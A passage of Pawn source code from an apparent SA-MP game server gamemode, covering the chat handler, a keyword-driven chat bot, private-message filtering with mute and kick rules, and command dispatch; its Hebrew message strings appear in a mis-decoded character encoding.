			format(string,sizeof(string),"%s %s [ID: %03d | %s]",Options[8][optActive] ? ("") : ("{FFFFFF}"),text,playerid,ColouredTag(playerid));
			format(stringwc,sizeof(stringwc),"%s %s [ID: %03d | %s]",Options[8][optActive] ? ("") : ("{FFFFFF}"),ColouredChat(text),playerid,ColouredTag(playerid));
		}
	}
	format(lastChatText,sizeof(lastChatText),text);
	dbg(8,"6B");
	if(!Options[8][optActive] && MAXCLANS != MAX_CLANS) for(new i = 1; i <= MAXCLANS; i++) if(claninfo[i][cvalid] && strfind(text,claninfo[i][cname]) != -1)
	{
		format(colouredClan,sizeof(colouredClan),"{%s}%s{FFFFFF}",ClanHexColor(i),claninfo[i][cname]);
		format(stringwc,sizeof(stringwc),strreplace(stringwc,claninfo[i][cname],colouredClan));
	}
	dbg(8,"6C");
	for(new i = 0; i < sizeof(chatKeywords); i++)
	{
		if(strfind(string,chatKeywords[i][ckWord],true) != -1) format(string,sizeof(string),strreplace(string,chatKeywords[i][ckWord],chatKeywords[i][ckReplaceTo]));
		if(strfind(stringwc,chatKeywords[i][ckWord],true) != -1) format(stringwc,sizeof(stringwc),strreplace(stringwc,chatKeywords[i][ckWord],chatKeywords[i][ckReplaceTo]));
		if(strfind(string,"рчхц",true) != -1) format(string,sizeof(string),strreplace(string,"рчхц","%s"),"%%");
		if(strfind(stringwc,"рчхц",true) != -1) format(stringwc,sizeof(stringwc),strreplace(stringwc,"рчхц","%s"),"%%");
	}
	format(string,sizeof(string),"%s:%s",GetName(playerid),string);
	format(stringwc,sizeof(stringwc),"%s:%s",GetName(playerid),stringwc);
	dbg(8,"6D");
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !playerinfo[i][silence][sil_chat])
	{
		if(playerinfo[i][setting][setting_colchat]) SendClientMessage(i,pColor,stringwc);//SendPlayerMessageToPlayer(i,playerid,stringwc);
		else SendClientMessage(i,pColor,string);//SendPlayerMessageToPlayer(i,playerid,string);
	}
	dbg(8,"7");
	if(equal(text,replytest) && strlen(replytest) > 0)
	{
		SendClientMessage(playerid,green," !фшўёш ∙фўьу· ∙ххф ьшўёш ∙Ёщ·я сюсчя фчц°ф");
		new pay = replytestlevel * 200;
		if(replytesttime < 4.0) pay += 50 * (5-floatround(replytesttime));
		format(string,sizeof(string)," [фЎьщч ьчцх° Єь фшўёш фыщ юф° хцыф с-%d$! [·хъ %.2f ∙Ёщх· %s",pay,replytesttime,GetName(playerid));
		SendClientMessageToAll(green,string);
		act_SaveWin(playerid,act_Code(aid_chat,3));
		GiveMoney(playerid,pay, 11);
		format(replytest,sizeof(replytest),"");
		replytestlevel = 0, replytesttime = 0.0, CActID = -1;
		KillTimer(chatacttimer);
		KillTimer(replytesttimer);
	}
	#if lagtest
		LagTest_End("OnPlayerText_codeA");
	#endif
	dbg(8,"8");
	if(boton && !botdelay[1])
	{
		#define f(%1) strfind(text,%1,true) != -1
		new bool:talksToBot = (f("схш") || f(botname) || f("bot") || bottalkingto == playerid), wc = charcount(text,' ');
		if((f("р·°") || f("Їх°хэ")) && f("юф") && f("ы·хс·"))
		{
			format(string,sizeof(string)," %s :ы·хс· фЇх°хэ ∙ьЁх фщр",webpage);
			return BotSay(string);
		}
		if(f("Єц°ф") && f("рЁщ") && f("Ў°щъ")) return BotSay(" /help :ьЄц°ф, °∙хэ р· фЇўхуф");
		if(f("ющ") && f("?") && (f("ю·ыЁ·") || f("сЁф") || f("Є∙ф") || f("щЎ°"))) return BotSay(" /Credits :ь°∙щю· щхЎ°щ фюху");
		if((f("шщэёЇщў") || f("∙°· ущсх°") || f("шщэ ёЇщў") || f("шщюёЇщў") || f("шщю ёЇщў") || f("teamspeak") || f("team speak") || f("ts") || f("ххЁш")) && f("юф"))
		{
			format(string,sizeof(string)," %s :ы·хс· ∙°· ф%s ∙ьЁх фщр",talkprogramip,talkprogram == 2 ? ("шщэёЇщў") : ("ххЁш°щьх"));
			return BotSay(string);
		}
		if(f("рующя") && f("ющ ") && f("?")) return BotSay(" /admins :ьЎЇщщф с°∙щю· фрующЁщэ фючхс°щэ");
		if(f("Ў'щш°") || f("фрў") || f("Ўщш°")) return BotSay(" /Report [ID] [Reason] :ьр ьуххч Єь Ў'щш°щэ сЎ'рш! ф∙·ю∙х с");
		if(talksToBot && f("юф") && (f("юЎс") || f("ўх°ф") || f("Ё∙юЄ")))
		{
			new wassupHE[][64] =
			{
				" (: ?%s рЁщ ю°тщ∙ юЎхщщя. юф рщ·ъ",
				" ^^ ?фыь шхс, %s. юф рщ·ъ",
				" ?рЁщ сёу°, %s. юф рщ·ъ",
				" ?·хуф ∙∙рь·, %s. фыь сёу° рЎьщ. юф рщ·ъ",
				" ?%s, фыь сёу° =] юф рщ·ъ"
			};
			new wassupEN[][64] =
			{
				" (: ?рЁщ ю°тщ∙ юЎхщщя. юф рщ·ъ %s",
				" ^^ ?юф рщ·ъ .%s ,фыь шхс",
				" ?юф рщ·ъ ,%s рЁщ сёу°",
				" ?фыь сёу° рЎьщ. юф рщ·ъ .%s ,·хуф ∙∙рь·",
				" ?фыь сёу° =] юф рщ·ъ ,%s"
			};
			bottalkingto = playerid, botdelay[0] = 30;
			format(string,sizeof(string),playerinfo[playerid][rname]);
			format(string,sizeof(string),!PlayerDefinedName(playerid) ? (wassupEN[random(sizeof(wassupEN))]) : (wassupHE[random(sizeof(wassupHE))]),equal(string,"no") || !strlen(string) ? (GetName(playerid)) : (string));
			return BotSay(string,true);
		}
		if(talksToBot && (f("сёу°") || f("юЎхщщя") || f("юЎхщя") || f("шхс") || f("рчьф") || f("ёссф") || f("юЄхьф")))
		{
			new imhappy[][16] =
			{
				" .∙юч ь∙юхЄ",
				" .шхс ьуЄ·",
				" [= рчьф"
			};
			bottalkingto = INVALID_PLAYER_ID, botdelay[0] = 0;
			return BotSay(imhappy[random(sizeof(imhappy))]);
		}
		if(talksToBot && (f("∙·хў") || f("∙ўш") || f("shut up") || f("ё·хэ") || f("∙·Єў")))
		{
			new stfu[][32] =
			{
				" .ьр",
				" .ьр °хЎф",
				" !ьр",
				" .рюю.. ьр чх∙с",
				" .ьр Ё°рф ьщ"
			};
			if(playerinfo[playerid][angry][0] < sizeof(stfu)) playerinfo[playerid][angry][0]++;
			if(playerinfo[playerid][angry][0] == sizeof(stfu)-1)
			{
				format(string,sizeof(string)," !стьь ∙Ёщёф ьф∙·щў рх·х %s юю∙ ыхЄё Єь ,%s ,Ё°рф ыщ фсхш ∙ьЁх",GetName(playerid),botname);
				News(string);
			}
			return BotSay(playerinfo[playerid][angry][0] >= sizeof(stfu)-1? (stfu[random(sizeof(stfu))]):(stfu[playerinfo[playerid][angry][0]]));
		}
		if(talksToBot && f("р·ф") && f("чщщь") && f("Єющ·") && wc <= 5) return BotSay(" !ыя");
		if(talksToBot && ((f("щхЎ°") && f("∙ьъ")) || (f("щЎ°") && f("рх·ъ"))) && wc <= 4) return BotSay(" .фщхЎ° ∙ьщ фхр Єющ· хрЁщ Ёрюя ьх ьыь чщщ");
		if(talksToBot && f("р·ф") && f("ющ") && f("?")) return BotSay(" .рЁщ фсхш ∙ь ф∙°·, ф·Їўщу ∙ьщ фхр ьЄцх° ь∙чўЁщэ");
		if((f("рщъ") || f("ыщЎу")) && f("ыёє") && (f("ьф∙щт") || f("ьўсь") || f("ьф°ххщч") || f("ю°ххщчщэ") || f("юўсьщэ") || f("ьЄ∙х·"))) return BotSay(" /Mode 9 :ыущ ьуЄ· рщъ ьф°ххщч ыёє ф∙·ю∙х сЇўхуф");
		if((f("рщъ") || f("ыщЎу") || f("рщЇф") || f("фщыя")) && f("Ё∙ўщэ") && (f("ьф∙щт") || f("ўхЁщэ") || f("ьўЁх·"))) return BotSay(" /Mode 8 :ьЄц°ф Єэ чЁх· фЁ∙ўщэ ф∙·ю∙х сЇўхуф");
		if((f("рщъ") || f("ыщЎу")) && (f("сщ·") || f("с·щэ")) && (f("ьўЁх·") || f("ўхЁщэ"))) return BotSay(" /Mode 45 :ьЄц°ф Єэ с·щэ ф∙·ю∙х сЇўхуф");
		if((f("рщъ") || f("ыщЎу")) && (f("Єхьщэ") || f("ьЄьх·")) && f("°юф")) return BotSay(" .ф°юф ·Єьф ьъ рхшхюшщ· ы∙·тщЄ ьюёЇ° фф°щтх· фу°х∙");
		if(f("∙щтх°щэ") && (f("рщцф") || f("юф"))) return BotSay(" /Tele, /Teleports, /TM :ь°∙щю· ф∙щтх°щэ ф∙·ю∙ срч· юфЇўхух·");
		if((f("рщЇф") || f("фщыя")) && f("чЁх·") && f("Ё∙ўщэ")) return BotSay(" /Find рх сЇўхуф /Ammu ф∙·ю∙ с∙щтх°");
		if((f("рщЇф") || f("фщыя")) && f("сЁў")) return BotSay(" /Find рх сЇўхуф /Bank ф∙·ю∙ с∙щтх°");
		if(f("рщъ") && f("∙хьчщэ") && (f("pm") || f("ф\"Ї") || f("ф.Ї") || (f("Ї°шщ·") && f("ф.")) || (f("фхуЄф") && f("Ї°шщ·")))) return BotSay(" /PM [ID] [Text] :ф∙·ю∙х сЇўхуф");
		if(f("рщъ") && (f("юЎш°Їщэ") || f("ющЎш°Їщэ") || f("юЎ·°Їщэ") || f("ющЎ·°Їщэ")) && (f("ЇЄщьх·"))) return BotSay(" /Join :ь°хс фЇЄщьхщх·, фЇўхуф ьфЎш°Їх· фщр");
		if(f("рщъ") && (f("юЎш°Їщэ") || f("ющЎш°Їщэ") || f("юЎ·°Їщэ") || f("ющЎ·°Їщэ") || f("юр∙°щэ")) && (f("ьўьря") || f("ьўья"))) return BotSay(" /Accept :юЎш°Їщэ ьўьря срюЎЄх· фЇўхуф");
		if(f("рщъ") && (f("щхЎрщэ") || f("ьЎр·") || f("∙·т°")) && (f("DM") || f("ущрэ") || f("ущрю") || f("ущ-рэ") || f("ущ-рю"))) return BotSay(" рх ф∙·т°х ьюўхэ рч° /qdmz Єь юЁ· ьЎр· юрцх° ущ-рэ ф∙·ю∙х сЇўхуф");
		if(f("ыюф") && (f("∙чўЁщэ") || f("ю∙·ю∙щэ") || f("ючхс°щэ")))
		{
			new op = 0;
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i)) op++;
			format(string,sizeof(string)," .юёЇ° ф∙чўЁщэ фючхс°щэ ы°тЄ ь∙°· фхр %d",op);
			return BotSay(string);
		}
		if((f("сря") || f("ф∙Єщф") || f("ф∙Єщщф") || f("чёщюф")) && (f("·х°щу") || f("ьфх°щу") || f("ючў") || f("unban")))
		{
			format(string,sizeof(string)," %s :фх°у· срЁщэ ю·сЎЄ· у°ъ Їх°хэ ю∙хс хЄц°ф ср·° ∙ьЁх",webpage);
			return BotSay(string);
		}
		if((f("∙ьхэ") || f("фщщ") || f("рфья")) && (f("ыхьэ") || f("рЁ∙щэ") || f("чс°щэ") || f("чс°ф") || f("чс°'ф")))
		{
			bottalkingto = playerid, botdelay[0] = 30;
			new hello[][32] =
			{
				" ?фщщ, юф ўх°ф",
				" !∙ьхэ",
				" ?фщщ, юф фюЎс"
			};
			if(random(sizeof(hello)+1) == sizeof(hello))
			{
				new helloEN[][64] =
				{
					" ?%s юф ўх°ф",
					" !%s фщщ",
					" ?%s юф фюЎс"
				};
				new helloHE[][64] =
				{
					" ?юф ўх°ф %s",
					" !фщщ %s",
					" ?юф фюЎс %s"
				};
				bottalkingto = playerid, botdelay[0] = 30;
				format(string,sizeof(string),playerinfo[playerid][rname]);
				format(string,sizeof(string),!PlayerDefinedName(playerid) ? (helloEN[random(sizeof(helloEN))]) : (helloHE[random(sizeof(helloHE))]),equal(string,"no") || !strlen(string) ? (GetName(playerid)) : (string));
				return BotSay(string,true);
			}
			else return BotSay(hello[random(sizeof(hello))]);
		}
		if(talksToBot && f("∙Єф") && wc <= 4)
		{
			new td[3];
			gettime(td[0],td[1],td[2]);
			format(string,sizeof(string)," .%02d:%02d ф∙Єф фщр",td[0],td[1]);
			return BotSay(string);
		}
		if(talksToBot && f("·р°щъ") && wc <= 4)
		{
			new td[3];
			getdate(td[0],td[1],td[2]);
			format(string,sizeof(string)," .%02d/%02d/%04d ф·р°щъ фхр",td[2],td[1],td[0]);
			return BotSay(string);
		}
		if(talksToBot && (f("щхэ") && f("фщхэ")) && wc <= 5)
		{
			new td[3];
			getdate(td[0],td[1],td[2]);
			format(string,sizeof(string)," .фщхэ щхэ %s",GetDay(td[0],td[1],td[2],1));
			return BotSay(string);
		}
		if(f("щ∙") && f("ЇЄщьх·") && f("ЇхЄь·")) return BotSay(thereIsAct ? (" .щ∙ ы°тЄ ЇЄщьх· ЇхЄь·") : (" .рщя ы°тЄ ЇЄщьх· ЇхЄь·"));
		if((f("ыщЎу") || f("рщъ") || (f("юф") && f("Їўхуф"))) && (f("ь∙юх°") || f("∙ющ°ф") || f("∙ющ°·")) && (f("ёўщя") || f("уюх·"))) return BotSay(" .Єь юЁ· ь∙юх° ёўщя / уюх· /saveskin ф∙·ю∙ сЇўхуф");
		if(f("юф") && f("цф") && f("ЇщўрЇ") && wc <= 5) return BotSay(" .ЇщўрЇ фхр ·юхЁф юё·хсс· сю∙чў ∙рЇ∙° ьўч· рх·ф хьўсь ююЁф ю∙фх");
		if(f("юф") && f("цф") && (((f("Ў'ў") || f("Ўў")) && f("ЇхщЁш")) || (f("check") && f("point"))) && wc <= 5) return BotSay(" .Ў'ўЇхщЁш фхр юЄть рухэ сю∙чў ∙ўх°ф ю∙фх ы∙ЁыЁёщэ рьщх");
		if(talksToBot && ((f("·ф°хт") && f("рх·щ")) || (f("kill") && f("me"))) && wc <= 4) return command(playerid,"/kill"), 0;
		if(f("цц·щ") || f("BB") || f("Bye") || f("ьф·°рх·") || (f("сщщ") && f("ыхьэ")))
		{
			new bb[][32] =
			{
				" .ьф·°рх·",
				" .сщщ сщщ",
				" !сщщ, ·чцх° ь∙чў ∙хс",
				" BB :)"
			};
			return BotSay(bb[random(sizeof(bb))]);
		}
		if(talksToBot && (f("юЇт°") || f("рщущхш") || f("юшхюшэ") || f("шщЇ∙") || f("фхюх") || f("юё°щч")))
		{
			if(wc <= 6)
			{
				new word[16];
				#define syncword(%1) if(f(%1)) word = %1
				syncword("юЇт°");
				else syncword("рщущхш");
				else syncword("юшхюшэ");
				else syncword("шщЇ∙");
				else syncword("фхюх");
				else syncword("юё°щч");
				#undef syncword
				if(!strlen(word))
				{
					new curseEN[][32] =
					{
						" >< .р·ф юЄЎся рх·щ %s",
						" .%s юёЇщў",
						" .%s ущ ьўьь рх·щ",
						" .%s ущ ьфЎщў ьщ"
					}, curseHE[][32] =
					{
						" >< .%s р·ф юЄЎся рх·щ",
						" .юёЇщў %s",
						" .ущ ьўьь рх·щ %s",
						" .ущ ьфЎщў ьщ %s"
					};
					if(PlayerDefinedName(playerid)) format(string,sizeof(string),curseHE[random(sizeof(curseHE))],playerinfo[playerid][rname]);
					else format(string,sizeof(string),curseEN[random(sizeof(curseEN))],GetName(playerid));
				}
				else format(string,sizeof(string)," .р·ф %s",word);
			}
			else
			{
				new saywoot[][32] =
				{
					" ...рЁщ ьр юсщя рх·ъ",
					" .ьр фсЁ·щ",
					" .ус° щх·° с°х°, рЁщ ьр юсщя"
				};
				format(string,sizeof(string),saywoot[random(sizeof(saywoot))]);
			}
			return BotSay(string);
		}
		if(talksToBot && f("ыёє"))
		{
			if(f("сў∙ф"))
			{
				if(playerinfo[playerid][pleasemoney] || Reward_Check(playerid,"BotMoney"))
				{
					new dgive[][32] =
					{
						" .ыс° фср·щ ьъ",
						" .рщя ьщ Єху с∙сщьъ",
						" .·хыь ьўсь Єху °ў рч°щ ∙·Ўр",
						" !?р·ф чх∙с ∙ыёє туь Єь фЄЎщэ"
					};
					if(playerinfo[playerid][angry][1] < sizeof(dgive)) playerinfo[playerid][angry][1]++;
					if(playerinfo[playerid][angry][1] == sizeof(dgive)-1)
					{
						format(string,sizeof(string)," !стьь ∙сщў∙ ф°сф ыёє %s юю∙ ыхЄё Єь ,%s ,Ё°рф ыщ фсхш ∙ьЁх",GetName(playerid),botname);
						News(string);
					}
					return BotSay(playerinfo[playerid][angry][1] >= sizeof(dgive)-1? (dgive[random(sizeof(dgive))]):(dgive[playerinfo[playerid][angry][1]]));
				}
				else
				{
					new amounts[] =
					{
						1,
						5,	5,	5,	5,	5,
						10,	10,	10, 10, 10, 10, 10, 10,
						20,	20,	20, 20, 20, 20, 20, 20,
						50,	50,	50, 50, 50,
						100, 100,
						250
					};
					new giveMoney = !random(30) ? 500 : amounts[random(sizeof(amounts))];
					playerinfo[playerid][pleasemoney] = 1;
					GiveMoney(playerid,giveMoney, 12);
					Reward_Give(playerid,"BotMoney");
					format(string,sizeof(string)," (: .ўщсь· %d$, ·фЁф",giveMoney);
					if(giveMoney < 10) News(" !схш ўюЎя ЁюЎр с∙°·");
					return BotSay(string);
				}
			}
			else
			{
				new nimus[][32] =
				{
					" .юфщ ющь· фўёэ? Ёёф ьсў∙ ∙хс",
					" .·сў∙ сЁщюхё хрЁщ рч∙хс Єь цф"
				};
				return BotSay(nimus[random(sizeof(nimus))]);
			}
		}
		if(talksToBot && (f("∙ьъ") || f("∙ъ") || f("∙'ъ")) && (f("Є°х") || f("ё·х") || f("тюх") || f("Єўх")))
		{
			new mama[][16] =
			{
				" .∙·хў",
				" .ьр Ё°рф ьщ"
			};
			return BotSay(mama[random(sizeof(mama))],true);
		}
		if(talksToBot && (f("CD") || f("ёЇщ°ф") || f("countdown")))
		{
			if(!botcd)
			{
				if(cd[0])
				{
					new twocd[][64] =
					{
						" !?·тщу ьщ р·ф ьр °хрф ∙щ∙ ыс° ёЇщ°ф",
						" .рЁщ рхьщ схш рсь рЁщ ьр шюсь, щ∙ ыс° ёЇщ°ф"
					};
					format(string,sizeof(string),twocd[random(sizeof(twocd))]);
				}
				else
				{
					new numOfSeconds = -1;
					for(new i = 0, len = strlen(text); i < len; i++) if(text[i] >= '1' && text[i] <= '9')
					{
						if(numOfSeconds == -1) numOfSeconds = text[i]-('1'-1);
						else
						{
							numOfSeconds = 3;
							break;
						}
					}
					botcd = 300, cdtext[0] = "~b~$NUM$", cdtext[1] = "~r~go~h~!", cd[0] = 1, cd[1] = numOfSeconds == -1 ? 3 : numOfSeconds;
					new usecd[][16] =
					{
						" (: !ссў∙ф",
						" !сыщє"
					};
					format(string,sizeof(string),usecd[random(sizeof(usecd))]);
				}
				return BotSay(string);
			}
			else
			{
				new left = botcd/60;
				if(!left) format(string,sizeof(string)," .·сў∙ ююЁщ Єху Їчх· юуўф");
				else if(left == 1) format(string,sizeof(string)," .·сў∙ ююЁщ Єху уўф сЄ°ъ");
				else format(string,sizeof(string)," .·сў∙ ююЁщ сЄху %d уўх· сЄ°ъ",left);
				return BotSay(string);
			}
		}
		if(talksToBot && wc < 4)
		{
			new what[][16] =
			{
				" ?ыя",
				" ?",
				" ?юф",
				" Yes?"
			};
			bottalkingto = playerid, botdelay[0] = 30;
			return BotSay(what[random(sizeof(what))],true);
		}
		#undef f
	}
	dbg(8,"9");
	SetString(playerinfo[playerid][lasttext],text);
	format(playerinfo[playerid][lasttext],M_S,text);
	#if lagtest
		LagTest_EndEx("OnPlayerText(%s)",text);
	#endif
	dbg(8,"10");
	if(debugstate) printf("OnPlayerText(%s(%d),%s) end",GetName(playerid),playerid,text);
	return 0;
}
//=[OnPlayerPrivmsg]============================================================
public OnPlayerPrivmsg(playerid, recieverid, text[])
{
	if(debugstate) printf("OnPlayerPrivmsg(%s(%d),%s(%d),%s) start",GetName(playerid),playerid,GetName(recieverid),recieverid,text);
	#if lagtest
		LagTest_Start("OnPlayerPrivmsg");
	#endif
	new string[M_S];
	format(string,sizeof(string)," to (%d)%s: %s",recieverid,GetName(recieverid),text);
	Log("PMs",playerid,string);
	if(fexist(fuser(playerid)) && !playerinfo[playerid][logged]) return SendClientMessage(playerid,red," /login :ьр Ёщ·я ь∙ьхч фхуЄх· Ї°шщх· ьЇЁщ ∙ф·чс°·. ьф·чс°х·"), 0;
	if(IsPlayerMAdmin(playerid) || IsPlayerMAdmin(recieverid))
	{
		//Log("Attention",playerid,string);
		format(string,sizeof(string),"[PM] %s (%d) to %s (%d): %s",GetName(playerid),playerid,GetName(recieverid),recieverid,text);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][sadmin] && !IsPlayerMAdmin(i))) SendClientMessage(i,0xF7A26FFF,string);
	}
	if(playerinfo[playerid][nopm]) return SendClientMessage(playerid,red," .рщЁъ юх°∙ф ьы·хс фхуЄх· Ї°шщх·"), 0;
	if(IsPlayerAFK_(playerid)) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ь∙ьхч фхуЄх· Ї°шщх· ыр∙° р·ф сюЎс"), 0;
	if(IsPlayerAFK_(recieverid))
	{
		if(strlen(playerinfo[recieverid][afkreason]) > 0)
		{
			format(string,sizeof(string)," .[%s] AFK ю∙·ю∙ цф ЁюЎр ы°тЄ сюЎс",playerinfo[recieverid][afkreason]);
			SendClientMessage(playerid,red,string);
		}
		else SendClientMessage(playerid,red," .AFK ю∙·ю∙ цф ЁюЎс ы°тЄ сюЎс");
		return -1;
	}
	dbg(9,"1");
	if(advertisement(text,"фхуЄф Ї°шщ·",playerid,"found in pm")) return 0;
	dbg(9,"2");
	if(Curse(text) && !IsPlayerMAdmin(playerid))
	{
		new bool:m=false, pos, chars[] = {'!','#','$','*'};
		for(new s=0;s<words_count;s++) while((pos = strfind(text,words[s],true)) != -1) for(new i=pos, j=pos+strlen(words[s]);i<j;i++) text[i] = chars[random(sizeof(chars))];
		if(!playerinfo[playerid][mtime])
		{
			playerinfo[playerid][mtime] = 1;
			SendClientMessage(playerid,red," .ффхуЄф ∙ы·с· юыщьф ўььх· хьыя ЎхЁц°ф, сЇЄэ фсрф ∙·ўьь ·х∙·ў");
		}
		if(playerinfo[playerid][mtime] == 1) playerinfo[playerid][mtime] = 0, m = true;
		if(m)
		{
			playerinfo[playerid][mtime] += mute_time;
			if(playerinfo[playerid][mtime] / mute_time == 3) SetKick(playerid,INVALID_PLAYER_ID,"юўьь");
			else
			{
				playerinfo[playerid][mute][0] = playerinfo[playerid][mtime];
				SetTimerPck(playerinfo[playerid][mute][1],"UnMute",1000,1,"d",playerid);
				format(string,sizeof(string)," .фх∙·ў· ь %d ∙Ёщх· юфёщсф ∙ўщьь· сЇ°шщ",playerinfo[playerid][mtime]);
				SendClientMessage(playerid,red,string);
				format(string,sizeof(string)," *** %s has been muted for %d seconds by %s. (юўьь)",GetName(playerid),playerinfo[playerid][mtime],botname);
				for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
			}
		}
		return 0;
	}
	if(!playerinfo[playerid][pmlist]) if(equal(playerinfo[playerid][lastpmtext],text) && !IsPlayerMAdmin(playerid))
	{
		SendClientMessage(playerid,red," !ьр ьфЎщє");
		return 0;
	}
	SetString(playerinfo[playerid][lastpmtext],text);
	if(playerinfo[recieverid][ignore][playerid]) return SendClientMessage(playerid,red," .ф∙чўя рьщх Ёщёщ· ь∙ьхч фхуЄф Ї°шщ· чёэ рх·ъ"), -1;
	if(playerinfo[recieverid][blockpms]) return SendClientMessage(playerid,red," .ф∙чўя рьщх Ёщёщ· ь∙ьхч фхуЄф Ї°шщ· рщЁх юўсь фхуЄх· Ї°шщх·"), -1;
	if(!playerinfo[playerid][pmlist])
	{
		playerinfo[playerid][flood][1]++;
		if(playerinfo[playerid][flood][1] >= 2 && !IsPlayerMAdmin(playerid))
		{
			playerinfo[playerid][fwarns][1]++;
			format(string,sizeof(string)," !ьр ьфЎщє сЇ°шщ - рцф°ф юёЇ° %d ю·хъ 5",playerinfo[playerid][fwarns][1]);
			SendClientMessage(playerid,red,string);
			if(playerinfo[playerid][fwarns][1] >= 5) SetKick(playerid,INVALID_PLAYER_ID,"фЎЇф сЇ°шщ");
			return 0;
		}
	}
	dbg(9,"3");
	new stat = GetPlayerStatus(recieverid);
	if(stat > status_none && PlayerStatus[stat][statusBusy])
	{
		if(playerinfo[playerid][noticedmsg][0] != stat)
		{
			format(string,sizeof(string)," .ы°тЄ " @c(white) "%s" @c(yellow) " хщ·ыя ∙ьр щхыь ьЄЁх· %s",PlayerStatus[stat][statusName],GetName(recieverid));
			SendClientMessage(playerid,yellow,string);
			playerinfo[playerid][noticedmsg][0] = stat;
		}
		if(playerinfo[recieverid][noticedmsg][0] != stat)
		{
			format(string,sizeof(string)," .ыъ ∙щщуЄ ∙р·ф ы°тЄ " @c(white) "%s" @c(yellow) " хрхьщ ьр ·хыь ьЄЁх· %s-Ё∙ьчф фхуЄф рхшхюшщ· ь",PlayerStatus[stat][statusName],GetName(playerid));
			SendClientMessage(recieverid,yellow,string);
			playerinfo[recieverid][noticedmsg][0] = stat;
		}
	}
	if(!playerinfo[recieverid][noticedmsg][1])
	{
		SendClientMessage(recieverid,grey," (/r рх /reply :ыущ ьЄЁх· юф°)");
		playerinfo[recieverid][noticedmsg][1] = 1;
	}
	new pmstring[256];
	format(pmstring,sizeof(pmstring),"[PM] %s(%d) to %s(%d): %s",GetName(playerid),playerid,GetName(recieverid),recieverid,text);
	if(!playerinfo[playerid][pp]) for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[i][admin] >= playerinfo[playerid][admin] && playerinfo[i][admin] >= playerinfo[recieverid][admin] && (playerinfo[i][atoggle][atoggle_pm] || playerinfo[i][spectate] == playerid) && i != playerid && i != recieverid) SendClientMessage(i,0x24FF0AB9,pmstring);
	#if lagtest
		LagTest_EndEx("OnPlayerPrivmsg(%s)",text);
	#endif
	dbg(9,"4");
	if(debugstate) printf("OnPlayerPrivmsg(%s(%d),%s(%d),%s) end",GetName(playerid),playerid,GetName(recieverid),recieverid,text);
	return 1;
}
//=[OnPlayerCommandText]========================================================
public OnPlayerCommandText(playerid, cmdtext[])
{
	new ret = 0;
	if(IsPlayerNPC(playerid)) ret = OnNPCCommand(playerid,cmdtext);
	else
	{
		#if lagtest
		LagTest_Start("OnPlayerCommandText");
		#endif
		ret = OnPlayerCommand(playerid,cmdtext);
		new full[256];
		#if lagtest
		format(full,sizeof(full),"OnPlayerCommandText(%s)_%d",cmdtext,ret);
		LagTest_End(full);
		#endif
		if(debugstate && ret)
		{
			if(strfind(cmdtext," ") != -1)
			{
				new idx;
				full = strtok(cmdtext,idx);
			}
			else format(full,sizeof(full),cmdtext);
			for(new i = 0, j = strlen(full); i < j; i++) if(full[i] >= 'A' && full[i] <= 'Z') full[i] += 32;
			if(PropertyExists_INT(full))
			{
				new val = GetProperty_INT(full);
				fsetint(file_statistics,full,val+1);
				SetProperty_INT(full,val+1);
			}
			else SetProperty_INT(full,(fkeyexist(file_statistics,full) ? fgetint(file_statistics,full) : 0) + 1);
		}
	}
	return ret;
}
//=[OnNPCCommand]===============================================================
public OnNPCCommand(playerid, cmdtext[])
{
	new cmd[256], idx;
	cmd = strtok(cmdtext,idx);
	if(equal(cmd,"/maxplayers"))
	{
		new str[4];
		valstr(str,MAX_PLAYERS_);
		SendClientMessage(playerid,white,str);
		return 1;
	}
	if(equal(cmd,"/italk"))
	{
		cmd = strtok(cmdtext,idx);
		new to = strval(cmd);
		cmd = strrest(cmdtext,idx);
		format(talkBubble,sizeof(talkBubble),cmd);
		NPCTalk(GetName(playerid),cmd,to,1,1);
		return 1;
	}
	if(equal(cmd,"/italk2all"))
	{
		cmd = strrest(cmdtext,idx);
		format(talkBubble,sizeof(talkBubble),cmd);
		NPCTalk(GetName(playerid),cmd,-1,1,1);
		return 1;
	}
	return 0;
}
//=[OnPlayerCommand]============================================================
public OnPlayerCommand(playerid, cmdtext[])
{
	if(debugstate) printf("OnPlayerCommandText(%s(%d),%s)",GetName(playerid),playerid,cmdtext);
	if(!IsPlayerConnected(playerid) && playerid != ConsoleID) return 1;
	if(playerinfo[playerid][nocmd] || playerinfo[playerid][ball] > 0) return SendClientMessage(playerid,red," .рщЁъ юх°∙ф ьы·хс Їўхух·");
	if(!IsPlayerMAdmin(playerid) && (playerinfo[playerid][jail][0] > 0 || playerinfo[playerid][mute][0] > 0 || playerinfo[playerid][xjail]))
	{
		new string[M_S];
		if(playerinfo[playerid][xjail]) format(string,sizeof(string)," .ьр Ёщ·я ьы·хс Їўхух· ыр∙° р·ф сыьр");
		else if(playerinfo[playerid][jail][0] > 0) format(string,sizeof(string)," .ьр Ёщ·я ьы·хс Їўхух· ыр∙° р·ф сыьр, ·хыь ьы·хс ∙хс сЄху %d ∙Ёщх·",playerinfo[playerid][jail][0]);
		else if(playerinfo[playerid][mute][0] > 0) format(string,sizeof(string)," .ьр Ёщ·я ьы·хс Їўхух· ыр∙° р·ф юх∙·ў, ·хыь ьы·хс ∙хс сЄху %d ∙Ёщх·",playerinfo[playerid][mute][0]);
		return SendClientMessage(playerid,red,string);
	}
	playerinfo[playerid][flood][2]++;
	if(playerinfo[playerid][flood][2] >= 3 && !IsPlayerMAdmin(playerid))
	{
		new string[M_S];
		playerinfo[playerid][fwarns][2]++;
		format(string,sizeof(string)," !ьр ьфЎщє сЇўхух· - рцф°ф юёЇ° %d ю·хъ 5",playerinfo[playerid][fwarns][2]);
		SendClientMessage(playerid,red,string);
		if(playerinfo[playerid][fwarns][2] >= 5) SetKick(playerid,INVALID_PLAYER_ID,"фЎЇф сЇўхух·");
		return 1;
	}
	new cmd[256], idx, cmdstring[M_S];
	cmd = strtok(cmdtext,idx);
